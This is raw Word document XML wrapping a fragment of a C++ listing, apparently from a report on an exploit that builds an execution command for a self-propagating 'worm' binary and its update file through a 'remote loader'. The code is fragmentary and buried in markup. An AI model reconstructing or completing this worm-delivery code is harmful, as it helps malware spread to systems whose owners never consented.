        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ifs.open</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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pathname.c_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(), std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ios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9900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> | std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ios</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9900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>binary</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236 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>237         logger-&gt;log(</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prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Allocating buffer of size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238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 buffer = </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>new</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239         logger-&gt;log(</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prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Buffer allocated"</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240 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">241         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ifs.read</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(buffer,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242 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">243         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ifs.close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244 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">245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color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>int</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 0;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xml:space="preserve"> &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>fileSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 xml:space="preserve">246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buffer[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>i</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247         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">248         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">249         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> buffer;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">250         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>251         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>prepForSavingBinaryFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - content size is "</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> + boost::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>lexical_cast</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&lt;std::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&gt;(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>content.size</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252 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">253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content; </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// FIXME may be a slow copy and uses more memory</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>254 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">255 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">256 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>257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&gt; Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>createExecContent</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wormFilename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&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>updateFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>258         std::vector&lt;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&gt; content;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">259     </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">260         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Need the SAVE marker</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">261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262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'X'</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263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'E'</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264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'C'</w:t>
      </w:r>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265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266         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">267         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Note that a /some/path/ is prefixed to this by the remote loader</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">268         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>const</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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 xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cmdLine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormFilename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exe to run</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">269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270                                         + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>wormFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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path for worm to read its own exe</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">271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272                                         + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>optionsFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">273                                         +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br/>
        <w:t xml:space="preserve">274                                         + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>updateFilename</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>275                                         ;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">276         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">277         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
